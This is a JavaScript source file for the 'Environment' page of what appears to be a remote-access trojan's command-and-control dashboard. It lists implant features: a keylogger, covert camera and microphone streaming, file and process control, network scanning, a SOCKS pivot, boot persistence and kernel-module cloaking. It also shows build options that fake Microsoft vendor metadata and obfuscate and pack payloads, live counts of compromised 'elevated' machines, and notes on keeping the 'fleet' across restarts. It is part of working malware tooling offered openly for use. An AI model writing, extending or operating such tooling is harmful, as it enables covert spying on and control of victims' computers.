/* Environment: control-plane settings, capabilities and health. */

import * as store from '../store.js';
import * as theme from '../theme.js';
import { ico, copy, toast } from '../ui.js';
import { api } from '../api.js';
import { esc, num } from '../format.js';

const row = (k, v, hint = '') => `<dt>${esc(k)}</dt><dd>${v}${hint ? `<div class="dim tiny">${esc(hint)}</div>` : ''}</dd>`;

const FEATURES = [
  ['i-key', 'Keylogger', 'GetAsyncKeyState on Windows, evdev on Linux. Auto-dumps every 5 s while armed.'],
  ['i-cam', 'Live camera', 'MJPEG over the media channel; needs ffmpeg on the target.'],
  ['i-mic', 'Live microphone', '16 kHz mono PCM, decoded by Web Audio in the browser.'],
  ['i-folder', 'File browser', 'List, download, upload, mkdir and delete over the beacon.'],
  ['i-cpu', 'Process control', 'tasklist / ps plus taskkill / kill -9.'],
  ['i-network', 'Network scan', 'TCP sweep of the /24 plus the host socket table.'],
  ['i-share', 'SOCKS pivot', 'SOCKS5 endpoint fanning connections through a bot.'],
  ['i-anchor', 'Persistence', 'systemd unit, cron @reboot or HKCU Run key.'],
  ['i-ghost', 'Cloaking', 'Linux LKM or hidden system copy on Windows.'],
];

export const environment = {
  mount(root, route, ctx) {
    const cfg = store.state.config || {};
    const stats = store.state.stats || {};
    root.innerHTML = `
      <div class="page">
        <div class="page-head">
          <div class="ttl"><h1>Environment</h1>
            <p>Everything the control plane was started with. Secrets are masked; the PSK only ever
              leaves the server inside an encrypted beacon.</p></div>
          <div class="spacer"></div>
          <button class="btn ghost" id="erefresh">${ico('i-refresh')} Refresh</button>
        </div>

        <div class="env-grid">
          <div class="card">
            <div class="card-head">${ico('i-eye')}<h3>Appearance</h3></div>
            <div class="card-body" style="display:grid;gap:11px">
              <label class="tgl"><input type="checkbox" id="edark"> Dark surfaces</label>
              <div class="row" style="gap:10px">
                <span class="muted tiny">Accent</span>
                <div class="swatches" id="eaccents" role="group" aria-label="Accent colour"></div>
              </div>
              <p class="muted tiny">Per browser and instant: stored in <code>localStorage</code>, no server
                round trip. Dark is the default.</p>
            </div>
          </div>
          <div class="card">
            <div class="card-head">${ico('i-network')}<h3>Callback & transport</h3></div>
            <div class="card-body" style="display:grid;gap:10px">
              <dl class="kv">
                ${row('Callback URL', `<span class="mono">${esc(cfg.callback || '—')}</span>`)}
                ${row('PSK', `<span class="mono">${esc(cfg.psk_hint || '—')}</span>`, 'identical on every implant')}
                ${row('TLS on the C2', cfg.tls ? 'enabled' : 'terminated by the proxy')}
                ${row('Listen port', String(cfg.port ?? '—'))}
                ${row('SOCKS endpoint', `<span class="mono">${esc(cfg.socks || 'disabled')}</span>`)}
              </dl>
              <button class="btn sm" id="ecopy">${ico('i-copy')} Copy callback URL</button>
            </div>
          </div>

          <div class="card">
            <div class="card-head">${ico('i-box')}<h3>Build profile</h3></div>
            <div class="card-body" style="display:grid;gap:10px">
              <dl class="kv">
                ${row('Vendor metadata', cfg.vendor || 'Microsoft Corporation')}
                ${row('PE metadata / manifest', cfg.metadata ? 'on' : 'off')}
                ${row('AES-GCM payload seal', cfg.encrypt ? 'on' : 'off')}
                ${row('garble obfuscation', cfg.garble ? 'available' : 'not installed')}
                ${row('UPX packing', cfg.upx ? 'available' : 'not installed')}
                ${row('Bind size cap', `${cfg.max_bind_mb ?? 64} MB`)}
              </dl>
              <p class="muted tiny">Change these with the matching <code>PHANTOM_*</code> environment
                variable and restart the container.</p>
            </div>
          </div>

          <div class="card">
            <div class="card-head">${ico('i-pulse')}<h3>Live counters</h3></div>
            <div class="card-body">
              <dl class="kv" id="ecounters">
                ${row('Sessions', num(stats.sessions))}
                ${row('Online', num(stats.online))}
                ${row('Elevated', num(stats.elevated))}
                ${row('Streaming', num(stats.streaming))}
                ${row('Keylogging', num(stats.keylogging))}
                ${row('Queued commands', num(stats.queued))}
                ${row('Artifacts', num(stats.artifacts))}
              </dl>
            </div>
          </div>
        </div>
`;
    this.tail(root, cfg);

    const dark = root.querySelector('#edark');
    dark.checked = theme.theme() === 'dark';
    dark.onchange = () => theme.setTheme(dark.checked ? 'dark' : 'light');
    theme.swatches(root.querySelector('#eaccents'));
    document.addEventListener('phantom:theme', () => { dark.checked = theme.theme() === 'dark'; });

    const pull = async () => {
      try {
        store.state.stats = await api.stats();
        store.emit();
      } catch { /* transient */ }
    };
    pull();
    if (ctx) {
      ctx.timers = ctx.timers || [];
      ctx.timers.push(setInterval(pull, 5000));
    }
  },

  unmount(root, route, ctx) {
    (ctx?.timers || []).forEach((t) => clearInterval(t));
    if (ctx) ctx.timers = [];
  },

  tail(root, cfg) {
    root.querySelector('.page').insertAdjacentHTML('beforeend', `
        <div class="card">
          <div class="card-head">${ico('i-shield')}<h3>Operator capability matrix</h3>
            <span class="spacer"></span><span class="badge plain">per-OS requirements apply</span></div>
          <div class="card-body" style="padding:0">
            <table class="tbl">${FEATURES.map(([icon, name, note]) => `
              <tr><td style="width:34px">${ico(icon)}</td>
                <td style="width:170px"><b>${esc(name)}</b></td>
                <td class="muted tiny">${esc(note)}</td></tr>`).join('')}</table>
          </div>
        </div>

        <div class="card">
          <div class="card-head">${ico('i-info')}<h3>Deployment notes</h3></div>
          <div class="card-body" style="display:grid;gap:8px">
            <p class="muted tiny">Dashboard credentials are generated on first boot and written to
              <code>/data/auth</code>; the PSK lives in <code>/data/psk</code>. Mount <code>/data</code>
              on a persistent volume or every rebuild invalidates the fleet.</p>
            <p class="muted tiny">Sessions, command history and keylog archives are persisted to
              <code>/data/state.json</code> every few seconds, so a container restart keeps the fleet.</p>
            <p class="muted tiny">The health probe is <code>/healthz</code> and is unauthenticated on
              purpose, for the platform load balancer.</p>
          </div>
        </div>
      </div>`);

    root.querySelector('#ecopy').onclick = () => copy(cfg.callback || '', 'callback URL copied');
    root.querySelector('#erefresh').onclick = async () => {
      try {
        const [cfg2, stats2] = await Promise.all([api.config(), api.stats()]);
        store.state.config = cfg2;
        store.state.stats = stats2;
        store.emit();
        toast('environment reloaded');
      } catch (err) { toast(err.message, 'bad'); }
    };
  },

  update(root) {
    const kv = root.querySelector('#ecounters');
    if (kv) {
      const s = store.state.stats || {};
      kv.innerHTML = [['Sessions', s.sessions], ['Online', s.online], ['Elevated', s.elevated],
        ['Streaming', s.streaming], ['Keylogging', s.keylogging], ['Queued commands', s.queued],
        ['Artifacts', s.artifacts]].map(([k, v]) => row(k, num(v))).join('');
    }
  },
};
